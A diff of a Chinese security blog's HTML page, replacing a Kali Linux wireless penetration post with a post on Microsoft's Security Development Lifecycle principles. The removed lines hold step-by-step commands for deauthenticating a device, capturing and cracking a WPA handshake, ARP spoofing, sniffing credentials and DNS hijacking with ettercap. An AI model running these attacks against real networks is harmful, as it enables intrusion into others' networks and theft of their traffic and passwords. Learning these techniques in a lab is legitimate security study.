@@ -85,7 +85,7 @@
 
 
 
-  <meta name="keywords" content="无线渗透测试,">
+  <meta name="keywords" content="安全开发,">
 
 
 
@@ -98,25 +98,21 @@
 
 
 
-<meta name="description" content="新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。 前期渗透启用无线网卡1$ ifconfig wlan0 up  开启网卡监听模式1$ airmon-ng start wlan0  输入ifconfig命令查看网卡名称变为wlan0mon；输入iwconfig命令确认mode为monitor模式。  扫描附近wifi热点1$ airod">
-<meta name="keywords" content="无线渗透测试">
+<meta name="description" content="SDL简介SDL（Security Development Lifecycle）可信赖计算安全开发生命周期，是微软提出的一套帮助开发人员构建更安全软件和解决安全合规要求的同时，降低开发成本的软件开发过程。SDL流程在软件开发流程的每个阶段加入一系列关注安全性的活动和交付结果，这些活动和交付结果包括在软件设计过程中开发威胁模型、在实施过程中使用静态分析代码扫描工具以及在集中进行的”安全推动”过程中进">
+<meta name="keywords" content="安全开发">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux无线渗透初探">
-<meta property="og:url" content="http://yoursite.com/2019/04/06/Kali Linux无线渗透初探/index.html">
+<meta property="og:title" content="微软SDL（可信赖计算安全开发生命周期）">
+<meta property="og:url" content="http://yoursite.com/2019/04/28/SDL学习/index.html">
 <meta property="og:site_name" content="陋室">
-<meta property="og:description" content="新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。 前期渗透启用无线网卡1$ ifconfig wlan0 up  开启网卡监听模式1$ airmon-ng start wlan0  输入ifconfig命令查看网卡名称变为wlan0mon；输入iwconfig命令确认mode为monitor模式。  扫描附近wifi热点1$ airod">
+<meta property="og:description" content="SDL简介SDL（Security Development Lifecycle）可信赖计算安全开发生命周期，是微软提出的一套帮助开发人员构建更安全软件和解决安全合规要求的同时，降低开发成本的软件开发过程。SDL流程在软件开发流程的每个阶段加入一系列关注安全性的活动和交付结果，这些活动和交付结果包括在软件设计过程中开发威胁模型、在实施过程中使用静态分析代码扫描工具以及在集中进行的”安全推动”过程中进">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/images/ifconfig%20wlan0%20up.PNG">
-<meta property="og:image" content="http://yoursite.com/images/airmon-ng%20start%20wlan0.PNG">
-<meta property="og:image" content="http://yoursite.com/images/iwconfig.PNG">
-<meta property="og:image" content="http://yoursite.com/images/airodump-ng%20wlan0mon.PNG">
-<meta property="og:image" content="http://yoursite.com/images/airodump-ng.PNG">
-<meta property="og:image" content="http://yoursite.com/images/aireplay-ng.PNG">
-<meta property="og:updated_time" content="2019-04-05T19:53:01.757Z">
+<meta property="og:image" content="http://yoursite.com/images/SDL.gif">
+<meta property="og:image" content="http://yoursite.com/images/sdl_02.gif">
+<meta property="og:updated_time" content="2019-04-29T10:49:01.147Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Kali Linux无线渗透初探">
-<meta name="twitter:description" content="新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。 前期渗透启用无线网卡1$ ifconfig wlan0 up  开启网卡监听模式1$ airmon-ng start wlan0  输入ifconfig命令查看网卡名称变为wlan0mon；输入iwconfig命令确认mode为monitor模式。  扫描附近wifi热点1$ airod">
-<meta name="twitter:image" content="http://yoursite.com/images/ifconfig%20wlan0%20up.PNG">
+<meta name="twitter:title" content="微软SDL（可信赖计算安全开发生命周期）">
+<meta name="twitter:description" content="SDL简介SDL（Security Development Lifecycle）可信赖计算安全开发生命周期，是微软提出的一套帮助开发人员构建更安全软件和解决安全合规要求的同时，降低开发成本的软件开发过程。SDL流程在软件开发流程的每个阶段加入一系列关注安全性的活动和交付结果，这些活动和交付结果包括在软件设计过程中开发威胁模型、在实施过程中使用静态分析代码扫描工具以及在集中进行的”安全推动”过程中进">
+<meta name="twitter:image" content="http://yoursite.com/images/SDL.gif">
 
 
 
@@ -146,13 +142,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/06/Kali Linux无线渗透初探/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/28/SDL学习/">
 
 
 
 
 
-  <title>Kali Linux无线渗透初探 | 陋室</title>
+  <title>微软SDL（可信赖计算安全开发生命周期） | 陋室</title>
   
 
 
@@ -323,7 +319,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/06/Kali Linux无线渗透初探/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/28/SDL学习/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="aJ0ker">
@@ -340,7 +336,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux无线渗透初探</h1>
+          <h1 class="post-title" itemprop="name headline">微软SDL（可信赖计算安全开发生命周期）</h1>
         
 
         <div class="post-meta">
@@ -352,8 +348,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-06T01:18:55+08:00">
-                2019-04-06
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-28T23:07:52+08:00">
+                2019-04-28
               </time>
             
 
@@ -375,8 +371,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/无线网络渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">无线网络渗透</span>
+                  <a href="/categories/软件安全设计/" itemprop="url" rel="index">
+                    <span itemprop="name">软件安全设计</span>
                   </a>
                 </span>
 
@@ -392,7 +388,7 @@
 
           
           
-             <span id="/2019/04/06/Kali Linux无线渗透初探/" class="leancloud_visitors" data-flag-title="Kali Linux无线渗透初探">
+             <span id="/2019/04/28/SDL学习/" class="leancloud_visitors" data-flag-title="微软SDL（可信赖计算安全开发生命周期）">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -418,7 +414,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  741
+                  1.7k
                 </span>
               
 
@@ -434,7 +430,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  5
                 </span>
               
             </div>
@@ -455,44 +451,65 @@
       
 
       
-        <p>新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。</p>
-<h2 id="前期渗透"><a href="#前期渗透" class="headerlink" title="前期渗透"></a>前期渗透</h2><h3 id="启用无线网卡"><a href="#启用无线网卡" class="headerlink" title="启用无线网卡"></a>启用无线网卡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig wlan0 up</span><br></pre></td></tr></table></figure>
-<p><img src="/images/ifconfig wlan0 up.PNG" alt=""></p>
-<h3 id="开启网卡监听模式"><a href="#开启网卡监听模式" class="headerlink" title="开启网卡监听模式"></a>开启网卡监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
-<p><img src="/images/airmon-ng start wlan0.PNG" alt=""></p>
-<p>输入ifconfig命令查看网卡名称变为wlan0mon；<br>输入iwconfig命令确认mode为monitor模式。</p>
-<p><img src="/images/iwconfig.PNG" alt=""></p>
-<h3 id="扫描附近wifi热点"><a href="#扫描附近wifi热点" class="headerlink" title="扫描附近wifi热点"></a>扫描附近wifi热点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
-<p><img src="/images/airodump-ng wlan0mon.PNG" alt=""></p>
-<p>BSSID是路由器MAC地址，CH是无线信道。</p>
-<h3 id="对目标路由器进行抓包"><a href="#对目标路由器进行抓包" class="headerlink" title="对目标路由器进行抓包"></a>对目标路由器进行抓包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w <span class="built_in">cap</span> wlan0mon</span><br></pre></td></tr></table></figure>
-<p><img src="/images/airodump-ng.PNG" alt=""></p>
-<p>-c：信道<br>–bssid：路由器MAC地址<br>-w：指定抓到的包存放文件</p>
-<p>此时可查看路由器接入的设备MAC地址，但是无法抓取设备发送到路由器的密码认证数据包，需要将目标设备踢下线自动重连，抓取认证握手包。</p>
-<h3 id="将目标设备踢下线"><a href="#将目标设备踢下线" class="headerlink" title="将目标设备踢下线"></a>将目标设备踢下线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon</span><br></pre></td></tr></table></figure>
-<p><img src="/images/aireplay-ng.PNG" alt=""></p>
-<p>-0：发送n条认证消息<br>-a：路由器MAC地址<br>-c：目标设备MAC地址</p>
-<p>看到[WPA handshark:]代表成功抓取认证握手数据包。保存的文件目录中有cap-01.cap文件，通过爆破方式可解密认证密码。</p>
-<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aircrack-ng <span class="built_in">cap</span>-01.cap -w password.txt</span><br></pre></td></tr></table></figure>
-<h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p>接下来要对目标设备进行进一步攻击，如ARP欺骗、DNS劫持，等。</p>
-<h3 id="关闭网卡监听模式"><a href="#关闭网卡监听模式" class="headerlink" title="关闭网卡监听模式"></a>关闭网卡监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>
-<p>用爆破得到的密码连入目标无线网络，查看获取的IP地址，可推断出网关地址。</p>
-<p>用nmap扫描内网就可获取已接入的主机信息。</p>
-<h3 id="nmap扫描主机"><a href="#nmap扫描主机" class="headerlink" title="nmap扫描主机"></a>nmap扫描主机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sP 192.168.1.1/24</span><br></pre></td></tr></table></figure>
-<p>选择一台目标靶机，并开启流量转发功能，使靶机流量先经过kali再到路由器。</p>
-<h3 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
-<p>然后cat /proc/sys/net/ipv4/ip_forward，如果返回1代表流量转发成功。</p>
-<h3 id="对靶机进行ARP欺骗"><a href="#对靶机进行ARP欺骗" class="headerlink" title="对靶机进行ARP欺骗"></a>对靶机进行ARP欺骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ arpspoof -i wlan0 -t 192.168.1.3 -r 192.168.1.1</span><br></pre></td></tr></table></figure>
-<p>-i：网卡名称<br>-t：目标靶机IP地址<br>-r：网关IP地址</p>
-<p>此时已成功完成中间人攻击，可获取靶机到路由器的全部流量信息，可使用其他工具分析流量信息。</p>
-<h3 id="使用driftnet监听浏览的图片"><a href="#使用driftnet监听浏览的图片" class="headerlink" title="使用driftnet监听浏览的图片"></a>使用driftnet监听浏览的图片</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ driftnet -i wlan0</span><br></pre></td></tr></table></figure>
-<h3 id="使用wireshark分析包内容，或抓取账号密码"><a href="#使用wireshark分析包内容，或抓取账号密码" class="headerlink" title="使用wireshark分析包内容，或抓取账号密码"></a>使用wireshark分析包内容，或抓取账号密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wireshark &amp;</span><br></pre></td></tr></table></figure>
-<h3 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h3><p>首先添加一条解析</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
-<p>例：<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> A 1.1.1.1</p>
-<p>然后打开ettercap，[sniff]&gt;[Unified sniffing]，选择wlan0网卡，[Plugins]&gt;[Manage the plugins]，双击dns_spoof模块，最后[start]&gt;[start sniffing]。此时靶机打开google会解析到1.1.1.1，成功完成DNS劫持。</p>
-<p>以上攻击时建立在http协议上，对于https协议，可使用sslstrip对https进行降级，但会导致浏览器提示证书报错，对https协议攻击会另写一篇进行说明。</p>
-
+        <h2 id="SDL简介"><a href="#SDL简介" class="headerlink" title="SDL简介"></a>SDL简介</h2><p>SDL（Security Development Lifecycle）可信赖计算安全开发生命周期，是微软提出的一套帮助开发人员构建更安全软件和解决安全合规要求的同时，降低开发成本的软件开发过程。SDL流程在软件开发流程的每个阶段加入一系列关注安全性的活动和交付结果，这些活动和交付结果包括在软件设计过程中开发威胁模型、在实施过程中使用静态分析代码扫描工具以及在集中进行的”安全推动”过程中进行代码审核和安全测试。</p>
+<h2 id="SDL基本流程"><a href="#SDL基本流程" class="headerlink" title="SDL基本流程"></a>SDL基本流程</h2><p>Microsoft标准软件开发流程如下图所示，也是行业内的典型流程。该开发流程实际上是螺旋形的，在实施阶段可能需要经常重新考虑需求和设计问题。</p>
+<p><img src="/images/SDL.gif" alt=""></p>
+<p>实际实施中软件安全性方面的经验已经为构建更安全的软件建立了一套高标准的原则，Microsoft将这些原则称作SD3+C，即设计安全、默认安全、部署安全和通信。</p>
+<ul>
+<li>设计安全：在架构、设计和实现软件时，应该在运行时能保护自身及其处理的信息，并能抵御攻击。</li>
+<li>默认安全：实际实施中软件无法实现绝对的安全，为了使攻击者对软件缺陷发起攻击时造成的损失最小，软件在默认状态下应具有更高的安全性。如，软件应该在最低的必要权限下运行，非广泛需要的服务和功能在默认情况下应被禁用或仅可由特定用户访问。</li>
+<li>部署安全：软件应随附工具和指导以帮助最终用户和管理员安全地使用，且更新应易于部署。</li>
+<li>通信：软件开发者应及时明确地接收发现的产品漏洞，并负责提出处理措施。</li>
+</ul>
+<p>SD3+C每个要素都对开发流程提出了要求，但设计安全和默认安全对软件安全性提升作用最大，设计安全改进流程以防止在第一阶段引入漏洞，默认安全则要求软件默认状态下暴露的攻击面最小。</p>
+<p>在现有开发流程中引入继承SD3+C方法的安全措施后的改进流程结构如下图所示。</p>
+<p><img src="/images/sdl_02.gif" alt=""></p>
+<h2 id="安全设计核心原则"><a href="#安全设计核心原则" class="headerlink" title="安全设计核心原则"></a>安全设计核心原则</h2><p>SDL安全设计核心原则：</p>
+<ul>
+<li>Attack Surface Reduction：攻击面最小化</li>
+<li>Basic Privacy：基本隐私</li>
+<li>Least Privilege：权限最小化</li>
+<li>Secure Defaults：默认安全</li>
+<li>Defense in Depth：纵深防御</li>
+<li>Threat Modeling：威胁建模</li>
+</ul>
+<h3 id="攻击面最小化"><a href="#攻击面最小化" class="headerlink" title="攻击面最小化"></a>攻击面最小化</h3><p>攻击面是指程序任何能被用户或其他程序访问到的部分，这些暴露给用户的地方往往是最可能被恶意攻击者攻击的地方。攻击面最小化是指尽量减少暴露恶意用户可能发现并试图利用的攻击面数量。软件产品的受攻击面包括代码、接口、服务以及包括对所有用户提供服务的协议，尤其是那些未被验证或远程用户都可以访问到的协议。供给面分析主要着重于：</p>
+<ul>
+<li>降低默认执行的代码量</li>
+<li>限制可访问到代码的人员范围</li>
+<li>限定可访问到代码的人员身份</li>
+<li>降低代码执行所需的权限</li>
+</ul>
+<p>攻击面分析常用技巧：<br>| 高风险攻击面 | 低风险攻击面 |<br>| —— | —— |<br>| 默认开启 | 默认关闭 |<br>| 接口开启 | 接口关闭 |<br>| UDP协议 | TCP协议 |<br>| 匿名访问 | 经过身份验证的用户访问 |<br>| 保持开启 | 需要时开启 |<br>| 可互联网访问 | 仅本地网络访问 |</p>
+<p>攻击面最小化在微软的应用实践示例：<br>| Windows | RPC需要认证、防火墙默认打开 |<br>| IIS6.0、7.0 | 使用Network Service权限运行，默认关闭 |<br>| SQL Server 2008 | xp_cmdshell存储过程默认关闭，默认不开放远程链接 |<br>| VS 2005/2008 | Web Server金额SQL Server默认仅本地访问 |</p>
+<h3 id="基本隐私"><a href="#基本隐私" class="headerlink" title="基本隐私"></a>基本隐私</h3><p>用户使用软件时可能需要授予软件收集个人隐私信息的权限，企业有责任完善对个人信息的保护措施，确保用户隐私的安全性，隐私安全是建立可信任应用程序的关键因素。<br>在软件设计时考虑用户基本隐私的必要性和意义：</p>
+<ul>
+<li>履行法律规定和义务</li>
+<li>增加客户信赖</li>
+<li>防止堵塞部署</li>
+</ul>
+<p>在获取和收集用户隐私过程中，需要制定明确的隐私准则，以下是对用户隐私收集的部分建议：</p>
+<ul>
+<li>只收集程序必需的隐私数据，明确告知用户并征得用户同意。</li>
+<li>微软对于用户隐私数据（密码、口令等）需要加密存储，最低要求是SHA256+salt，对于更高要求的需要使用PBKDF2算法加密存储。</li>
+</ul>
+<h3 id="权限最小化"><a href="#权限最小化" class="headerlink" title="权限最小化"></a>权限最小化</h3><p>在进行软件设计时，安全设计人员可以评估应用程序的行为和功能所需的最低权限和访问级别，从而合理分配相应的权限，如果程序特定情况必须需要更高权限，也可以考虑特权赋予及释放机制，即使程序遭到攻击，也可以将损失降到最低。<br>常见的权限最小化实践如下：</p>
+<ul>
+<li>普通管理员/系统管理员等角色管理</li>
+<li>文件只读权限/文件访问权限等访问控制</li>
+<li>进程/服务以所需的最小用户权限运行</li>
+</ul>
+<p>权限最小化在微软的应用实践：</p>
+<ul>
+<li>Windows系统中网络进程、本地服务、用户进程的权限都较低且互相独立，分别为NETWORK SERVICE、LOCAL SERVICE、user权限，只有核心的重要进程使用SYSTEM权限。</li>
+<li>最新版本的office程序打开不可信来源的文档时，默认是不可编辑的，同时也是默认不可执行代码的，即使存在缓冲区溢出漏洞，也不会执行shellcode等恶意代码。</li>
+</ul>
+<h3 id="默认安全"><a href="#默认安全" class="headerlink" title="默认安全"></a>默认安全</h3><p>默认安全配置在客户熟悉安全配置选项前不仅有利于更好的帮助客户掌握安全配置经验，同时也可以确保应用程序初始状态下处于较安全状态，用户可根据实际使用情况决定应用程序安全与隐私等级水平是否降低。<br>默认安全在微软的应用实践：</p>
+<ul>
+<li>在Windows 7之后的Windows操作系统中，DEP（数据执行保护）默认开启，用户可根据需要选择DEP开启状态。</li>
+<li>Windows 10默认启用安全防护软件Windows Defender，用户可根据需要选择是否开启。</li>
+</ul>
+<h3 id="纵深防御"><a href="#纵深防御" class="headerlink" title="纵深防御"></a>纵深防御</h3>
       
     </div>
     
@@ -515,7 +532,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/无线渗透测试/" rel="tag"># 无线渗透测试</a>
+            <a href="/tags/安全开发/" rel="tag"># 安全开发</a>
           
         </div>
       
@@ -528,15 +545,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/04/27/安全加固/" rel="next" title="安全加固">
+                <i class="fa fa-chevron-left"></i> 安全加固
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/06/Android安全基础及环境配置/" rel="prev" title="Android安全基础及环境配置">
-                Android安全基础及环境配置 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -687,7 +704,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前期渗透"><span class="nav-number">1.</span> <span class="nav-text">前期渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启用无线网卡"><span class="nav-number">1.1.</span> <span class="nav-text">启用无线网卡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开启网卡监听模式"><span class="nav-number">1.2.</span> <span class="nav-text">开启网卡监听模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描附近wifi热点"><span class="nav-number">1.3.</span> <span class="nav-text">扫描附近wifi热点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对目标路由器进行抓包"><span class="nav-number">1.4.</span> <span class="nav-text">对目标路由器进行抓包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#将目标设备踢下线"><span class="nav-number">1.5.</span> <span class="nav-text">将目标设备踢下线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码爆破"><span class="nav-number">1.6.</span> <span class="nav-text">密码爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网漫游"><span class="nav-number">2.</span> <span class="nav-text">内网漫游</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭网卡监听模式"><span class="nav-number">2.1.</span> <span class="nav-text">关闭网卡监听模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap扫描主机"><span class="nav-number">2.2.</span> <span class="nav-text">nmap扫描主机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流量转发"><span class="nav-number">2.3.</span> <span class="nav-text">流量转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对靶机进行ARP欺骗"><span class="nav-number">2.4.</span> <span class="nav-text">对靶机进行ARP欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用driftnet监听浏览的图片"><span class="nav-number">2.5.</span> <span class="nav-text">使用driftnet监听浏览的图片</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用wireshark分析包内容，或抓取账号密码"><span class="nav-number">2.6.</span> <span class="nav-text">使用wireshark分析包内容，或抓取账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS劫持"><span class="nav-number">2.7.</span> <span class="nav-text">DNS劫持</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SDL简介"><span class="nav-number">1.</span> <span class="nav-text">SDL简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SDL基本流程"><span class="nav-number">2.</span> <span class="nav-text">SDL基本流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全设计核心原则"><span class="nav-number">3.</span> <span class="nav-text">安全设计核心原则</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击面最小化"><span class="nav-number">3.1.</span> <span class="nav-text">攻击面最小化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本隐私"><span class="nav-number">3.2.</span> <span class="nav-text">基本隐私</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限最小化"><span class="nav-number">3.3.</span> <span class="nav-text">权限最小化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#默认安全"><span class="nav-number">3.4.</span> <span class="nav-text">默认安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#纵深防御"><span class="nav-number">3.5.</span> <span class="nav-text">纵深防御</span></a></li></ol></li></ol></div>
             
 
           </div>
